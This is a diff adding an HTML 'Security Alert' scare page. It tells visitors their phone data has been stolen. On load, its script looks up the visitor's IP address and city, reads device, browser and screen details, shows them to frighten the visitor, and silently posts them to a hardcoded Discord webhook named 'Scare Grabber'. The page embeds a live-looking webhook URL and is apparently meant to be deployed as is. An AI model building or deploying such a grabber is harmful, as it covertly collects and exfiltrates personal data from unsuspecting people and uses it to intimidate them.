@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Security Alert</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        body {
+            background: #0a0a0f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 40px 30px;
+            max-width: 420px;
+            width: 100%;
+            border: 1px solid #ff0040;
+            box-shadow: 0 0 60px rgba(255, 0, 60, 0.2);
+            text-align: center;
+        }
+        .icon {
+            font-size: 56px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #ff0040;
+            font-size: 22px;
+            margin-bottom: 16px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        p {
+            color: #cccccc;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+        .data-box {
+            background: #0d0d1a;
+            border-radius: 10px;
+            padding: 16px;
+            margin: 20px 0;
+            border: 1px solid #2a2a40;
+            text-align: left;
+            font-size: 13px;
+            color: #aaa;
+            word-break: break-all;
+        }
+        .data-box span {
+            color: #ff0040;
+            font-weight: 700;
+        }
+        .warning {
+            color: #ff6666;
+            font-size: 13px;
+            margin-top: 10px;
+            border-top: 1px solid #2a2a40;
+            padding-top: 16px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="icon">📱</div>
+    <h1>⚠️ Your Phone Information Has Been Stolen</h1>
+    <p>Your device data was accessed remotely.</p>
+
+    <div class="data-box" id="infoBox">
+        <div>📡 <span>IP:</span> <span id="ip">Fetching...</span></div>
+        <div>📍 <span>Location:</span> <span id="location">Fetching...</span></div>
+        <div>💻 <span>Device:</span> <span id="device">Fetching...</span></div>
+        <div>🌐 <span>Browser:</span> <span id="browser">Fetching...</span></div>
+        <div>📐 <span>Screen:</span> <span id="screen">Fetching...</span></div>
+        <div>⏰ <span>Time:</span> <span id="time">Fetching...</span></div>
+    </div>
+
+    <p style="font-size:13px; color:#888;">This data has been logged.</p>
+    <div class="warning">🔒 Your device is now flagged.</div>
+</div>
+
+<script>
+    // ===== YOUR WEBHOOK =====
+    var WEBHOOK = "https://discord.com/api/webhooks/1519652009781887076/37_FqW5wKYAUNdvThxMxjArmVmtLJb0m8oC5JSW3oYfC5libvf_9Cg3vbmL0-IBg961O";
+
+    // ===== UPDATE THE PAGE WITH REAL DATA =====
+    function updatePage(info) {
+        document.getElementById('ip').textContent = info.ip || 'Unknown';
+        document.getElementById('location').textContent = info.location || 'Unknown';
+        document.getElementById('device').textContent = info.device || 'Unknown';
+        document.getElementById('browser').textContent = info.browser || 'Unknown';
+        document.getElementById('screen').textContent = info.screen || 'Unknown';
+        document.getElementById('time').textContent = info.time || 'Unknown';
+    }
+
+    // ===== SEND TO DISCORD =====
+    function sendToDiscord(info) {
+        if (!info) return;
+        var msg = '**📱 Device Info Stolen**\n' +
+            'IP: ' + info.ip + '\n' +
+            'Location: ' + info.location + '\n' +
+            'Device: ' + info.device + '\n' +
+            'Browser: ' + info.browser + '\n' +
+            'Screen: ' + info.screen + '\n' +
+            'Time: ' + info.time + '\n' +
+            'User Agent: `' + navigator.userAgent + '`';
+
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: msg,
+                username: 'Scare Grabber'
+            })
+        }).catch(function() {});
+    }
+
+    // ===== COLLECT INFO =====
+    function collectInfo() {
+        var info = {
+            ip: 'Fetching...',
+            location: 'Fetching...',
+            device: navigator.platform || 'Unknown',
+            browser: navigator.userAgent.split(' ').pop() || 'Unknown',
+            screen: screen.width + 'x' + screen.height,
+            time: new Date().toLocaleString()
+        };
+
+        // Get IP and location
+        fetch('https://api.ipify.org?format=json')
+            .then(function(r) { return r.json(); })
+            .then(function(d) {
+                info.ip = d.ip;
+                return fetch('https://ipapi.co/json/');
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(d) {
+                info.location = (d.city || 'Unknown') + ', ' + (d.country_name || 'Unknown');
+                updatePage(info);
+                sendToDiscord(info);
+            })
+            .catch(function() {
+                updatePage(info);
+                sendToDiscord(info);
+            });
+
+        // Update with what we already have
+        updatePage(info);
+    }
+
+    // ===== RUN =====
+    collectInfo();
+</script>
+
+</body>
+</html>
